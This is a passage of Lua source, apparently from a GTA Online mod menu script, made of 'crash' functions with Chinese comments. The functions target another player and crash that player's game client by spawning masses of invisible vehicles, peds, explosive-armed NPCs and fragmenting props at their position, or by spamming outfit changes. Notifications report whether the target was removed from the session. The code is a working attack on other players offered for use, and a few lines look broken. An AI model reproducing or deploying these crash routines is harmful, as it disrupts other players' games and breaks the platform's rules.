local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
for i = 0, 1000 do 
local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11 ,TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
wait(10)
end
wait(5500)
entities.delete_by_handle(Object_jb1)
entities.delete_by_handle(Object_jb2)
entities.delete_by_handle(Object_jb3)
entities.delete_by_handle(Object_jb4)
entities.delete_by_handle(Object_jb5)
entities.delete_by_handle(Object_jb6)
entities.delete_by_handle(Object_jb7)
entities.delete_by_handle(Object_jb8)
entities.delete_by_handle(Object_jb9)
entities.delete_by_handle(Object_jb10)
entities.delete_by_handle(Object_jb11)
end

--导弹车崩溃V1
function daodanchev1(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedVehicleList = { };
    for i = 1, 80 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
    wait(50)
    end
    wait(4000)
    for i = 1, 80 do
    entities.delete_by_handle(SpawnedVehicleList[i])
    end
    end

--导弹车崩溃V2
function daodanchev2(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    TargetPlayerPos.y = TargetPlayerPos.y + 1050
    SpawnedVehicleList1 = { };
    for i = 1, 60 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
    wait(50)
    end
    wait(2000)
    for i = 1, 60 do
    entities.delete_by_handle(SpawnedVehicleList1[i])
    end
    wait(1000)
    SpawnedVehicleList2 = { };
    for i = 1, 50 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
    wait(50)
    end
    wait(2000)
    for i = 1, 50 do
    entities.delete_by_handle(SpawnedVehicleList2[i])
    end
end

--无效外观V1
function BadOutfitCrashV1(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
        wait(10)
    end
       entities.delete_by_handle(Spawned_Mike)
       menu.trigger_commands("anticrashcam off")
    end

---单崩黄昏
function dhcrash(PlayerID)
    for pedp_crash = 2 , 6 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    wait(5000)
    for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
            wait(10)
        end
        wait(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
function OXcrashgg(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    wait(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    wait(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        
    wait(10000)
    
    entities.delete_by_handle(PED1)
    
        
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_fabien模型",colors.red)
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
        entities.delete_by_handle(PED2)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_manuel模型",colors.red)
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
        entities.delete_by_handle(PED3)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_taostranslator模型",colors.red)
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
        entities.delete_by_handle(PED4)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_taostranslator2模型",colors.red)
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
        entities.delete_by_handle(PED5)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_tenniscoach模型",colors.red)
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
            entities.delete_by_handle(PED6)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_wade模型",colors.red)
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(5000)
    
        entities.delete_by_handle(PED7)
        end
    if not players.exists(PlayerID) then
        notification("成功移除玩家",colors.red)
    end
end

function OXcrashggv2(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    wait(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    wait(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        
    wait(1000)
    
    entities.delete_by_handle(PED1)
        
    if players.exists(PlayerID) then
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
        entities.delete_by_handle(PED2)
        end
    if players.exists(PlayerID) then
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
        entities.delete_by_handle(PED3)
        end
    if players.exists(PlayerID) then
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
        entities.delete_by_handle(PED4)
        end
    if players.exists(PlayerID) then
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
        entities.delete_by_handle(PED5)
        end
    if players.exists(PlayerID) then
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
            entities.delete_by_handle(PED6)
        end
    if players.exists(PlayerID) then
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        wait(1000)
    
        entities.delete_by_handle(PED7)
        end
    if not players.exists(PlayerID) then
        notification("成功移除玩家",colors.blue)
    end
end

--改进露娜崩溃
function lunacrash(PlayerID)
    fishmm = state
    local TargetPPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(TargetPPed)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1992.8982, -780.7021, -0.37660158, false, false, false, false)
    menu.trigger_commands("levitatepassivemax 0")
    menu.trigger_commands("levitateassistup 0")
    menu.trigger_commands("levitateassistdown 0")
    menu.trigger_commands("noguns")
    menu.trigger_commands("invisibility on")
    wait(1000)
    menu.trigger_commands("acfish")
    wait(100)
    menu.trigger_commands(" on")
    wait(100)
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1813897027,15,true,true)
    wait(100)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),TargetPPos.x,TargetPPos.y,TargetPPos.z, false, false, false, false)
    wait(100)
wait(9000)
if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
    menu.trigger_commands("mpmale")
else
    menu.trigger_commands("mpfemale")
end
menu.trigger_commands("levitatepassivemax 0.6")
menu.trigger_commands("levitateassistup 0.6")
menu.trigger_commands("levitateassistdown 0.6")
menu.trigger_commands("levitate off")
menu.trigger_commands("noguns")
menu.trigger_commands("invisibility off")
notification("搞定",colors.red)
while fishmm do
    wait()
    PAD._SET_CONTROL_NORMAL(0, 25, 1)
end
end
---拖车崩
function tuocheb(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
    SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
    SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
    SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
    SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
    SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
    SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    for i = 0, 100 do 
        TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        wait(10)
    end
    wait(2000)
    entities.delete_by_handle(SpawnedTowtruck)
    entities.delete_by_handle(SpawnedDune1)
    entities.delete_by_handle(SpawnedDune2)
    entities.delete_by_handle(SpawnedBarracks31)
    entities.delete_by_handle(SpawnedBarracks32)
    entities.delete_by_handle(SpawnedBarracks1)
    entities.delete_by_handle(SpawnedBarracks2)
end 
---鬼崩
function guibeng(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
    local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
    local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
        wait(10 * math.random())
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
        wait(10 * math.random())
    end
    menu.trigger_commands("anticrashcam off")
end
---猎杀者
function huntercrash(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnedVehicleList = { };
    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        wait(50)
    end
    wait(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
    menu.trigger_commands("anticrashcam off")
end
--碎片崩溃V1
function v1_frag(PlayerID)
    BlockSyncs(PlayerID, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--碎片崩溃V2
function v2_frag(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
